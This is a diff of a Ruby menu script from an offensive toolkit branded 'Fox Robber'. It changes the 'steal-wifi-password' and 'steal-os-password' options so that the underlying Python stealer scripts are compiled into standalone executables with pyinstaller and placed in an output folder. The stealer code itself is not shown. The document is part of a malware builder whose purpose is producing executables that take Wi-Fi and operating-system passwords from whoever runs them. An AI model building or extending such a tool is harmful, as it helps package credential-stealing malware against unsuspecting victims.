@@ -79,16 +79,24 @@ while true
             case command_linux
             when '9', 'steal-wifi-password'
               puts 'Loading...'.blue
-              system('cp Linux/Linux_Steal\ WIFI\ password.py Out')
-              system('chmod -w-r+x Out/Linux_Steal\ WIFI\ password.py')
+              system('pyinstaller --onefile Linux/Linux_Steal\\ WIFI\\ password.py')
+              system('mv dist/Linux_Steal\\ WIFI\\ password Out')
+              system('rm -r dist')
+              system('rm Linux_Steal\\ WIFI\\ password.spec')
+              system('rm -r build')
+              system('rm -r Linux/__pycache__')
               puts 'File made by Fox Robber 🦊'.red
               system("echo \"\t<Press enter>\" | lolcat -a")
               gets.chomp
               break
             when '10', 'steal-os-password'
               puts 'Loading...'.blue
-              system('cp Linux/Linux_Steal\ OS\ password.py Out')
-              system('chmod -w-r+x Out/Linux_Steal\ OS\ password.py')
+              system('pyinstaller --onefile Linux/Linux_Steal\\ OS\\ password.py')
+              system('mv dist/Linux_Steal\\ OS\\ password Out')
+              system('rm -r dist')
+              system('rm Linux_Steal\\ OS\\ password.spec')
+              system('rm -r build')
+              system('rm -r Linux/__pycache__')
               puts 'File made by Fox Robber 🦊'.red
               system("echo \"\t<Press enter>\" | lolcat -a")
               gets.chomp
